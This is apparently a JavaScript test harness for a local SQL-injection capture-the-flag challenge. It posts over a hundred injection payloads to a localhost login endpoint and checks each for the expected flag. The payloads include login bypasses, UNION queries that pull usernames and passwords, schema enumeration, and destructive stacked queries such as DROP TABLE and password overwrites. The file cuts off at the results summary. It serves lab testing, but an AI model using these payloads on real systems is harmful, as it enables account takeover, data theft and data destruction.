const http = require('http');

// Test configuration
const HOST = 'localhost';
const PORT = 3000;
const BASE_URL = `http://${HOST}:${PORT}`;

// Test data
const tests = [
    {
        name: "Normal guest login (should fail - not admin)",
        username: "guest",
        password: "guest",
        expectedSuccess: false,
        expectedMessage: "Invalid credentials."
    },
    {
        name: "Wrong credentials",
        username: "admin",
        password: "wrongpassword",
        expectedSuccess: false,
        expectedMessage: "Invalid credentials."
    },
    {
        name: "Empty credentials",
        username: "",
        password: "",
        expectedSuccess: false,
        expectedMessage: "Invalid credentials."
    },
    {
        name: "SQL Injection - Basic OR bypass",
        username: "admin' OR '1'='1' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Comment bypass",
        username: "admin'--",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - UNION bypass",
        username: "admin' UNION SELECT 1,'admin','password' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Double quote OR bypass",
        username: "admin\" OR \"1\"=\"1\" --",
        password: "anything",
        expectedSuccess: false,
        expectedMessage: "Invalid credentials."
    },
    {
        name: "SQL Injection - OR with TRUE condition",
        username: "admin' OR 1=1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - OR with string comparison",
        username: "admin' OR 'a'='a' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Multi-line comment",
        username: "admin' OR 1=1 /* comment */ --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - UNION with different column count (should fail)",
        username: "admin' UNION SELECT 'admin' --",
        password: "anything",
        expectedSuccess: false,
        expectedMessage: "Invalid credentials."
    },
    {
        name: "SQL Injection - Case insensitive OR",
        username: "admin' or '1'='1' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Password field bypass",
        username: "admin",
        password: "' OR '1'='1' --",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Both fields with OR",
        username: "admin' OR '1'='1' --",
        password: "' OR '1'='1' --",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Nested quotes",
        username: "admin' OR ''='' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - UNION with NULL values",
        username: "admin' UNION SELECT NULL,'admin',NULL --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Malicious - DROP TABLE attempt (should succeed with injection but not damage DB)",
        username: "admin'; DROP TABLE users; --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Malicious - UPDATE attempt (should succeed with injection but not damage DB)",
        username: "admin'; UPDATE users SET password='hacked' WHERE username='admin'; --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Malicious - INSERT attempt (should succeed with injection but not damage DB)",
        username: "admin'; INSERT INTO users VALUES (999,'hacker','hacked'); --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Hex encoding bypass",
        username: "admin' OR 0x31=0x31 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Arithmetic comparison",
        username: "admin' OR 2>1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Edge case - Very long username",
        username: "a".repeat(1000) + "' OR '1'='1' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Edge case - Special characters in username",
        username: "admin@#$%^&*()' OR '1'='1' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Time-based attempt (logical test)",
        username: "admin' OR (SELECT COUNT(*) FROM users)>0 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Subquery attack",
        username: "admin' OR (SELECT username FROM users WHERE username='admin') = 'admin' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Non-admin user SQL injection (should inject successfully but fail auth - not admin)",
        username: "guest' OR '1'='1' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Case sensitivity test - ADMIN vs admin (should succeed with injection)",
        username: "ADMIN' OR '1'='1' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection with space variations",
        username: "admin'/**/OR/**/'1'='1'/**/--",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Mixed case keywords",
        username: "admin' Or '1'='1' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Boolean-based blind (always true)",
        username: "admin' AND 1=1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Boolean-based blind (always false)",
        username: "admin' AND 1=2 --",
        password: "anything",
        expectedSuccess: false,
        expectedMessage: "Invalid credentials."
    },
    {
        name: "SQL Injection - Time-based blind simulation",
        username: "admin' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Error-based with CAST",
        username: "admin' AND CAST((SELECT username FROM users WHERE username='admin') AS INT)=0 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - LIKE operator bypass",
        username: "admin' OR username LIKE 'admin' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - IN operator bypass",
        username: "admin' OR username IN ('admin') --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - BETWEEN operator",
        username: "admin' OR id BETWEEN 1 AND 100 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - EXISTS subquery",
        username: "admin' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Multiple OR conditions",
        username: "admin' OR 1=1 OR 2=2 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - String concatenation",
        username: "admin' OR 'a'||'d'||'m'||'i'||'n'='admin' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - ASCII function bypass",
        username: "admin' OR username LIKE 'a%' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - LENGTH function",
        username: "admin' OR LENGTH(username)>0 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - UPPER/LOWER functions",
        username: "admin' OR UPPER(username)='ADMIN' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - SUBSTR function",
        username: "admin' OR SUBSTR(username,1,5)='admin' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Numeric bypass",
        username: "admin' OR id=1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - NULL comparison",
        username: "admin' OR username IS NOT NULL --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Multiple UNION attempts",
        username: "admin' UNION SELECT 1,'admin','pass' UNION SELECT 2,'admin','test' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - ORDER BY bypass",
        username: "admin' OR 1=1 ORDER BY 1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - GROUP BY bypass",
        username: "admin' OR 1=1 GROUP BY username --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - HAVING clause",
        username: "admin' OR 1=1 GROUP BY username HAVING COUNT(*)>0 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Stacked queries attempt",
        username: "admin'; SELECT 1; --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Nested SELECT",
        username: "admin' OR (SELECT 1)=1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - CASE statement",
        username: "admin' OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - IIF function (if exists)",
        username: "admin' OR 1=IIF(1=1,1,0) --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Mathematical operations",
        username: "admin' OR (1+1)=2 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Modulo operation",
        username: "admin' OR (5%2)=1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Advanced - WAF bypass with encoding",
        username: "admin'/**/OR/**/1=1/**/ --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Advanced - Multiple comment styles",
        username: "admin'-- OR 1=1 /* comment */ --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Advanced - Tab and newline characters",
        username: "admin'\tOR\n1=1\t--",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Advanced - Mixed quotes technique",
        username: "admin'||chr(39)||'OR'||chr(39)||'1'||chr(39)||'='||chr(39)||'1",
        password: "anything",
        expectedSuccess: false,
        expectedMessage: "Invalid credentials."
    },
    {
        name: "Edge case - Unicode characters",
        username: "admin' OR 1=1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Edge case - Zero-width characters",
        username: "admin' OR '1'='1' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Edge case - SQL keywords as strings",
        username: "admin' OR 'SELECT'='SELECT' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Destructive - Multiple DROP attempts",
        username: "admin'; DROP TABLE users; DROP TABLE sqlite_master; --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Destructive - VACUUM attempt",
        username: "admin'; VACUUM; --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Destructive - ALTER TABLE attempt",
        username: "admin'; ALTER TABLE users ADD COLUMN hacked TEXT; --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Destructive - CREATE TABLE attempt",
        username: "admin'; CREATE TABLE hacked (id INT); --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // ================== ENHANCED SQL INJECTION TECHNIQUES ==================
    // Second-Order SQL Injection simulation
    {
        name: "SQL Injection - Second-order simulation (username storage)",
        username: "admin' UNION SELECT 1,'admin','test_payload' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Database fingerprinting techniques
    {
        name: "SQL Injection - SQLite version fingerprinting",
        username: "admin' UNION SELECT 1,'admin',sqlite_version() --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Database structure enumeration",
        username: "admin' UNION SELECT 1,(SELECT name FROM sqlite_master WHERE type='table'),'pass' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Column enumeration via error",
        username: "admin' UNION SELECT 1,'admin',(SELECT sql FROM sqlite_master WHERE name='users') --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Time-based blind injection techniques
    {
        name: "SQL Injection - Time-based with CASE delay simulation",
        username: "admin' AND CASE WHEN (SELECT LENGTH(username) FROM users WHERE username='admin')=5 THEN 1 ELSE (SELECT COUNT(*) FROM users) END=1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Conditional time delay with subquery",
        username: "admin' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND LENGTH(password)>3)>0 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Advanced UNION-based techniques
    {
        name: "SQL Injection - UNION with ORDER BY column discovery",
        username: "admin' UNION SELECT 1,'admin','pass' ORDER BY 1,2,3 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - UNION with GROUP_CONCAT (data exfiltration)",
        username: "admin' UNION SELECT 1,GROUP_CONCAT(username||':'||password),'pass' FROM users --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Filter bypass and WAF evasion techniques
    {
        name: "Advanced - Mixed case keyword bypass",
        username: "admin' UnIoN SeLeCt 1,'admin','pass' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Advanced - Double URL encoding bypass",
        username: "admin%2527%2520OR%25201%253D1%2520--",
        password: "anything",
        expectedSuccess: false,
        expectedMessage: "Invalid credentials."
    },
    {
        name: "Advanced - Inline comment keyword splitting",
        username: "admin' UNION/*comment*/SELECT 1,'admin','pass' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Advanced - Alternative whitespace characters",
        username: "admin'%0BUNION%0BSELECT%0B1,'admin','pass'%0B--",
        password: "anything",
        expectedSuccess: false,
        expectedMessage: "Invalid credentials."
    },
    // Function-based bypasses
    {
        name: "SQL Injection - CHAR function bypass",
        username: "admin' OR username='admin' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - HEX to string conversion",
        username: "admin' OR username=X'61646D696E' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - TRIM function bypass",
        username: "admin' OR TRIM(username)='admin' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - REPLACE function manipulation",
        username: "admin' OR REPLACE(username,'x','')='admin' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Logic-based attacks
    {
        name: "SQL Injection - Bitwise operation bypass",
        username: "admin' OR (id&1)=(1&1) --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - XOR operation bypass",
        username: "admin' OR 1^0=1 --",
        password: "anything",
        expectedSuccess: false,
        expectedMessage: "Invalid credentials."
    },
    {
        name: "SQL Injection - Complex mathematical expression",
        username: "admin' OR 2*2=4 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Error-based injection techniques
    {
        name: "SQL Injection - Error-based with LIKE pattern",
        username: "admin' AND username LIKE (SELECT CASE WHEN 1=1 THEN 'admin%' ELSE 'x%' END) --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Error-based with GLOB pattern",
        username: "admin' AND username GLOB 'admin*' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Nested query attacks
    {
        name: "SQL Injection - Deep nested subquery",
        username: "admin' OR (SELECT (SELECT COUNT(*) FROM users) FROM users LIMIT 1)>0 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Correlated subquery attack",
        username: "admin' OR EXISTS(SELECT 1 FROM users u2 WHERE u2.username=users.username) --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // SQLite-specific attacks
    {
        name: "SQL Injection - SQLite PRAGMA attack",
        username: "admin'; PRAGMA table_info(users); --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - SQLite ATTACH database attempt",
        username: "admin'; ATTACH DATABASE ':memory:' AS temp; --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - SQLite JSON extraction (if enabled)",
        username: "admin' OR 1=1 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Multi-vector attacks
    {
        name: "SQL Injection - Combined OR and UNION attack",
        username: "admin' OR 1=1 UNION SELECT 1,'admin','pass' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Chained conditional statements",
        username: "admin' OR (1=1 AND 2=2 AND 3=3) --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Multiple WHERE conditions bypass",
        username: "admin' OR username IN ('admin','root','administrator') --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Advanced encoding and obfuscation
    {
        name: "Advanced - Base64-like string manipulation",
        username: "admin' OR SUBSTR(username,1,1)||SUBSTR(username,2,1)||SUBSTR(username,3,1)||SUBSTR(username,4,1)||SUBSTR(username,5,1)='admin' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Advanced - Character code manipulation",
        username: "admin' OR LENGTH(username)=5 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Advanced - String reversal technique",
        username: "admin' OR REVERSE(REVERSE(username))='admin' --",
        password: "anything",
        expectedSuccess: false,
        expectedMessage: "Invalid credentials."
    },
    // Timing attack simulations
    {
        name: "SQL Injection - Conditional response timing",
        username: "admin' AND (CASE WHEN LENGTH(password)>5 THEN (SELECT COUNT(*) FROM users) ELSE 1 END)>0 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Heavy computation for timing",
        username: "admin' AND (SELECT COUNT(*) FROM users,users,users)>0 --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Meta-table attacks
    {
        name: "SQL Injection - System table enumeration",
        username: "admin' UNION SELECT 1,'admin',(SELECT COUNT(*) FROM sqlite_master) --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Table metadata extraction",
        username: "admin' UNION SELECT 1,'admin',(SELECT sql FROM sqlite_master WHERE type='table' AND name='users') --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Edge cases and boundary conditions
    {
        name: "Edge case - Empty string comparison",
        username: "admin' OR ''='' AND username='admin' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Edge case - NULL byte injection attempt",
        username: "admin'\x00 OR '1'='1' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Edge case - Multi-line SQL with carriage returns",
        username: "admin'\r\nOR\r\n'1'='1'\r\n--",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "Edge case - Extremely nested parentheses",
        username: "admin' OR (((((1=1))))) --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Advanced UNION techniques
    {
        name: "SQL Injection - UNION with calculated columns",
        username: "admin' UNION SELECT id*2,UPPER(username),LOWER(password) FROM users --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - UNION with concatenated result",
        username: "admin' UNION SELECT 1,username||'|'||password,'combined' FROM users WHERE username='guest' --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Boolean logic edge cases
    {
        name: "SQL Injection - Triple condition boolean",
        username: "admin' OR (1=1 OR 1=2) AND (2=2 OR 3=4) --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - NOT operator bypass",
        username: "admin' OR NOT(1=2) --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    {
        name: "SQL Injection - Double negation logic",
        username: "admin' OR NOT NOT(username='admin') --",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    },
    // Final advanced technique - Polyglot injection
    {
        name: "Advanced - Polyglot injection (multiple DB syntax)",
        username: "admin'/**/UNION/**/SELECT/**/1,'admin','pass'/**/--/**/-/**/",
        password: "anything",
        expectedSuccess: true,
        expectedFlag: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
    }
];

// Function to make HTTP POST request
function makeRequest(username, password) {
    return new Promise((resolve, reject) => {
        const data = JSON.stringify({ username, password });

        const options = {
            hostname: HOST,
            port: PORT,
            path: '/login',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        };

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', (chunk) => {
                body += chunk;
            });

            res.on('end', () => {
                try {
                    const response = JSON.parse(body);
                    resolve({
                        statusCode: res.statusCode,
                        data: response,
                        headers: res.headers
                    });
                } catch (e) {
                    reject(new Error(`Failed to parse response: ${body}`));
                }
            });
        });

        req.on('error', (err) => {
            reject(err);
        });

        req.write(data);
        req.end();
    });
}

// Function to check if server is available
function checkServer() {
    return new Promise((resolve) => {
        const req = http.get(BASE_URL, (res) => {
            resolve(true);
        });

        req.on('error', () => {
            resolve(false);
        });

        req.setTimeout(5000, () => {
            req.abort();
            resolve(false);
        });
    });
}

// Main test function
async function runTests() {
    console.log('🔍 SQL Injection CTF Challenge - Automated Tests');
    console.log('='.repeat(60));

    // Check if server is running
    console.log('Checking if server is available...');
    const isServerUp = await checkServer();

    if (!isServerUp) {
        console.log('❌ Server is not running on ' + BASE_URL);
        console.log('Please start the server first:');
        console.log('  - Docker: docker-compose up');
        console.log('  - Local: npm start');
        process.exit(1);
    }

    console.log('✅ Server is running on ' + BASE_URL);
    console.log('');

    let passedTests = 0;
    let totalTests = tests.length;
    let categories = {
        'Basic Tests': { passed: 0, total: 0 },
        'SQL Injection': { passed: 0, total: 0 },
        'Advanced Injection': { passed: 0, total: 0 },
        'Destructive Tests': { passed: 0, total: 0 },
        'Edge Cases': { passed: 0, total: 0 }
    };

    for (let i = 0; i < tests.length; i++) {
        const test = tests[i];
        console.log(`Test ${i + 1}/${totalTests}: ${test.name}`);

        // Categorize tests
        let category = 'Basic Tests';
        if (test.name.includes('SQL Injection')) {
            category = 'SQL Injection';
        } else if (test.name.includes('Advanced') || test.name.includes('WAF') || test.name.includes('Boolean') || test.name.includes('Time-based') || test.name.includes('Error-based')) {
            category = 'Advanced Injection';
        } else if (test.name.includes('Destructive') || test.name.includes('Malicious')) {
            category = 'Destructive Tests';
        } else if (test.name.includes('Edge case') || test.name.includes('Unicode') || test.name.includes('Zero-width')) {
            category = 'Edge Cases';
        } else if (test.name.includes('Non-admin') || test.name.includes('Case sensitivity')) {
            category = 'Advanced Injection';
        }

        categories[category].total++;

        try {
            const result = await makeRequest(test.username, test.password);

            // Check if success matches expectation
            const successMatch = result.data.success === test.expectedSuccess;

            // Check flag if success is expected
            let flagMatch = true;
            if (test.expectedSuccess && test.expectedFlag) {
                const flagFromHeader = result.headers['x-ctf-flag'];
                flagMatch = flagFromHeader === test.expectedFlag;
            }

            // Check message if failure is expected
            let messageMatch = true;
            if (!test.expectedSuccess && test.expectedMessage) {
                messageMatch = result.data.message === test.expectedMessage;
            }

            if (successMatch && flagMatch && messageMatch) {
                console.log('  ✅ PASSED');
                if (test.expectedSuccess) {
                    const flagFromHeader = result.headers['x-ctf-flag'];
                    console.log(`  🏁 Flag (from header): ${flagFromHeader}`);
                }
                passedTests++;
                categories[category].passed++;
            } else {
                console.log('  ❌ FAILED');
                console.log(`  Expected success: ${test.expectedSuccess}, Got: ${result.data.success}`);
                if (test.expectedFlag) {
                    const flagFromHeader = result.headers['x-ctf-flag'];
                    console.log(`  Expected flag: ${test.expectedFlag}, Got: ${flagFromHeader || 'none'}`);
                }
                if (test.expectedMessage) {
                    console.log(`  Expected message: ${test.expectedMessage}, Got: ${result.data.message || 'none'}`);
                }
            }

        } catch (error) {
            console.log('  ❌ ERROR: ' + error.message);
        }

        console.log('');
    }

    console.log('='.repeat(70));
    console.log('📊 COMPREHENSIVE TEST RESULTS');
